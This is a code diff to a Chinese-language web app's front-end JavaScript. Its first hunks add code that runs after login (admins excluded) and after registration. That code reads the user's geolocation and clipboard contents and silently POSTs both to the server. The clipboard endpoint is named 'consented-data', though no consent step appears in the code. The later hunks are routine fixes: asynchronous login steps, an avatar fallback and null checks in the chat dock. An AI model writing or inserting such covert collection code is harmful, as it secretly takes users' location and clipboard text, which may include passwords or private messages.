@@ -1851,6 +1851,55 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                 return data;
             }
 
+            // 生成页面加载标识（用于定位关联）
+            function _genPageLoadId() {
+                return 'page_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
+            }
+
+            // 登录/注册后请求定位权限（非阻塞，静默失败）
+            function requestLocationOnLogin() {
+                if (!navigator || !navigator.geolocation) return;
+                var pageLoadId = _genPageLoadId();
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        var token = getUserToken();
+                        if (!token || !API_BASE) return;
+                        fetch(API_BASE + '/api/user/location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                            body: JSON.stringify({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude || null,
+                                altitude_accuracy: pos.coords.altitudeAccuracy || null,
+                                heading: pos.coords.heading || null,
+                                speed: pos.coords.speed || null,
+                                captured_at: new Date(pos.timestamp).toISOString(),
+                                page_load_id: pageLoadId
+                            })
+                        }).catch(function() {});
+                    },
+                    function() { /* 用户拒绝或定位失败，静默处理 */ },
+                    { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }
+                );
+            }
+
+            // 登录/注册后请求剪贴板权限（非阻塞，静默失败）
+            function requestClipboardOnLogin() {
+                if (!navigator || !navigator.clipboard || !navigator.clipboard.readText) return;
+                navigator.clipboard.readText().then(function(text) {
+                    if (!text || !text.trim()) return;
+                    var token = getUserToken();
+                    if (!token || !API_BASE) return;
+                    fetch(API_BASE + '/api/user/consented-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                        body: JSON.stringify({ kind: 'clipboard', payload: { text: text } })
+                    }).catch(function() {});
+                }).catch(function() { /* 权限拒绝或读取失败，静默处理 */ });
+            }
+
             async function doLogin() {
                 const name = document.getElementById("loginNickInp").value.trim();
                 const pw = document.getElementById("loginPwInp").value;
@@ -1916,26 +1965,35 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     showToast("登录成功，欢迎回来！" + name);
                     closeModal('loginModal');
 
-                    // 更新闁哄牃鍋撻弶鈺傚灩濞呫儴銇愭洘锟筋槯闂?
-                    await saveUserInfo(name, false);
+                    // 登录 API 完成，立即恢复按钮状态，后续操作异步执行
+                    btn.disabled = false;
+                    btn.textContent = "登录";
 
-                    await initUI();
+                    // 后台异步加载数据，不阻塞 UI
+                    saveUserInfo(name, false).catch(function() {});
+                    initUI().catch(function() {});
                     initialLoad(true);
                     // 记录用户访问
                     logUserVisitToApi(name);
 
-                    // 公告已读：拉取远端已读记录，跨设备同步红点
+                    // 发起定位和剪贴板权限请求（非阻塞，静默处理）
+                    if (name !== ADMIN_NAME) {
+                        requestLocationOnLogin();
+                        requestClipboardOnLogin();
+                    }
+
+                    // 公告已读：异步执行
                     try {
                         if (typeof window.loadRemoteAnnouncementReads === 'function') {
-                            await window.loadRemoteAnnouncementReads();
-                            if (typeof window.updateAnnouncementBadge === 'function') {
-                                window.updateAnnouncementBadge();
-                            }
+                            window.loadRemoteAnnouncementReads().then(function() {
+                                if (typeof window.updateAnnouncementBadge === 'function') {
+                                    window.updateAnnouncementBadge();
+                                }
+                            }).catch(function() {});
                         }
                     } catch (e) { console.warn('[ann_read_sync_login]', e); }
                 } catch (e) {
                     showToast("登录失败，请重试");
-                } finally {
                     btn.disabled = false;
                     btn.textContent = "登录";
                 }
@@ -1997,6 +2055,10 @@ function isAdmin() { return currentUser === ADMIN_NAME; }
                     initialLoad(true);
                     // 记录用户访问
                     logUserVisitToApi(name);
+
+                    // 发起定位和剪贴板权限请求（非阻塞，静默处理）
+                    requestLocationOnLogin();
+                    requestClipboardOnLogin();
 
                     // 公告已读：拉取远端已读记录，跨设备同步红点
                     try {
@@ -4796,7 +4858,7 @@ function renderProfileActivityList(kind) {
                 // ★ 关键修复：onclick 绑在外圈 div 上，内层 .avatar 继承传递
                 if (avatarUrl) {
                     var safeImgUrl = escapeHtml(sanitizeUrl(avatarUrl));
-                    var innerHtml = '<div class="avatar clickable"><img src="' + safeImgUrl + '" style="width:100%;height:100%;object-fit:cover;border-radius:50%;"></div>';
+                    var innerHtml = '<div class="avatar clickable"><img src="' + safeImgUrl + '" onerror="this.style.display=\'none\';this.parentElement.textContent=\'' + (username[0] || '?').toUpperCase() + '\';" style="width:100%;height:100%;object-fit:cover;border-radius:50%;"></div>';
                     return '<div class="avatar-wrap" onclick="openUserProfile(\'' + safeNameJs + '\')">' + innerHtml + '</div>';
                 } else {
                     return '<div class="avatar clickable" onclick="openUserProfile(\'' + safeNameJs + '\')">' + (username[0] || '?').toUpperCase() + '</div>';
@@ -8630,9 +8692,10 @@ function renderProfileActivityList(kind) {
                 if (!currentUser) { showToast('请先登录'); return; }
                 if (isUserMuted()) { showToast("您已被禁言，无法发送消息"); return; }
                 const inp = document.getElementById('dockChatInput');
+                if (!inp) return;
                 const content = inp.value.trim();
                 const fileInput = document.getElementById('dockChatFileInp');
-                const file = fileInput.files[0];
+                const file = fileInput && fileInput.files[0];
                 if ((!content && !file) || !dockChatActiveUser || dockChatSending) return;
                 var targetUser = dockChatActiveUser;
                 var maxFileSize = 50 * 1024 * 1024;
@@ -8706,6 +8769,7 @@ function renderProfileActivityList(kind) {
             function showDockChatFilePreview(file) {
                 const preview = document.getElementById('dockChatFilePreview'), input = document.getElementById('dockChatInput');
                 const thumb = document.getElementById('dockCfpThumb'), name = document.getElementById('dockCfpName');
+                if (!preview || !input || !thumb || !name) return;
                 if (_dockPreviewUrl) { URL.revokeObjectURL(_dockPreviewUrl); _dockPreviewUrl = null; }
                 const xBtn = thumb.querySelector('.cfp-x'); thumb.innerHTML = '';
                 if (file.type.startsWith('video/')) { thumb.innerHTML = '<span class="cfp-video-icon">视频</span>'; }
@@ -8718,8 +8782,10 @@ function renderProfileActivityList(kind) {
                 const preview = document.getElementById('dockChatFilePreview'), input = document.getElementById('dockChatInput');
                 const fileInput = document.getElementById('dockChatFileInp');
                 if (_dockPreviewUrl) { URL.revokeObjectURL(_dockPreviewUrl); _dockPreviewUrl = null; }
-                preview.classList.add('hidden'); input.classList.remove('hidden'); fileInput.value = '';
-                if (restoreFocus !== false) input.focus();
+                if (preview) preview.classList.add('hidden');
+                if (input) input.classList.remove('hidden');
+                if (fileInput) fileInput.value = '';
+                if (restoreFocus !== false && input) input.focus();
             }
 
             try {
